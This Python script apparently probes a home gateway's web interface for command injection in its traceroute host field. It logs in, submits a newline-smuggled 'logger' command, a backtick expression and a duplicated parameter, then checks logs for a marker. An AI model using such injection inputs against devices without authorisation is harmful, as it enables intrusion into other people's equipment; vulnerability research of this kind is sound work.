#!/usr/bin/env python3
"""Bounded ipAddressTrace probes on action=TRACE (mirror ipping host probe)."""
import argparse
import json
import os
import time
import urllib.error
import urllib.parse
from pathlib import Path

from f1_ipping_control import ProbeClient, StopProbe, _csrf, _login_page
from f1_secrets import read_password_file
from f1_trace_control import TRACE_PATH, _diff, _read_log

ROOT = Path(__file__).resolve().parents[1]
MARKER = "genesis-trace-marker"
NEWLINE_HOST = "127.0.0.1\nlogger " + MARKER
BACKTICK_HOST = "`logger.`x"


def trace_fields(csrf, host):
    return [
        ("action", "TRACE"),
        ("CSRFtoken", csrf),
        ("ProtocolVersionTrace", "IPv4"),
        ("ipAddressTrace", host),
        ("MaxHopCount", "1"),
        ("MaxSize", "46"),
    ]


def classify(body):
    login = b"sign-me-in" in body.lower()
    rejected = b"Please enter valid ipv4/domain address" in body
    marker = MARKER.encode() in body
    return {"login_marker": login, "rejected_phrase": rejected, "marker_in_body": marker}


def run_probe(client, password):
    code, body = client.open(client.base + "/login.lp")
    client.csrf = _csrf(body)
    code, result = client.login("User", password)
    del password
    if code != 200 or result != "ok":
        raise StopProbe("Login failed")
    code, body = client.open(client.base + "/gateway.lp")
    client.csrf = _csrf(body)

    quiet = _read_log(client)
    results = []

    for name, host in (
        ("newline_logger", NEWLINE_HOST),
        ("backtick", BACKTICK_HOST),
    ):
        data = urllib.parse.urlencode(trace_fields(client.csrf, host)).encode()
        code, body = client.open(client.base + TRACE_PATH, data, "POST", timeout=45)
        after = _read_log(client)
        added = _diff(quiet, after)
        quiet = after
        row = {"case": name, "status": code, "bytes": len(body), **classify(body)}
        row["new_trace_helper"] = any(e.get("helper") == "igd_traceroute_helper" for e in added)
        results.append(row)

    pairs = trace_fields(client.csrf, "127.0.0.1")
    pairs.append(("ipAddressTrace", NEWLINE_HOST))
    data = urllib.parse.urlencode(pairs).encode()
    code, body = client.open(client.base + TRACE_PATH, data, "POST", timeout=45)
    after = _read_log(client)
    added = _diff(quiet, after)
    results.append(
        {
            "case": "duplicate_ipAddressTrace",
            "status": code,
            "bytes": len(body),
            **classify(body),
            "new_trace_helper": any(e.get("helper") == "igd_traceroute_helper" for e in added),
        }
    )

    return {
        "cases": results,
        "conclusion": "marker in body"
        if any(r["marker_in_body"] for r in results)
        else "hosts rejected or 500; no marker",
    }


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--password-file", type=Path, required=True)
    args = parser.parse_args()
    os.umask(0o077)
    directory = ROOT / "artifacts" / "ui" / (
        "trace-host-" + time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
    )
    directory.mkdir(parents=False, exist_ok=False)
    client = ProbeClient(directory)
    try:
        password = read_password_file(args.password_file)
        outcome = run_probe(client, password)
        (directory / "result.json").write_text(json.dumps(outcome, indent=2) + "\n")
        print(json.dumps({"result": outcome["conclusion"], "artifacts": str(directory)}), flush=True)
        return 0
    except (StopProbe, urllib.error.URLError, TimeoutError) as error:
        print("Stopped: " + str(error), flush=True)
        return 1


if __name__ == "__main__":
    raise SystemExit(main())
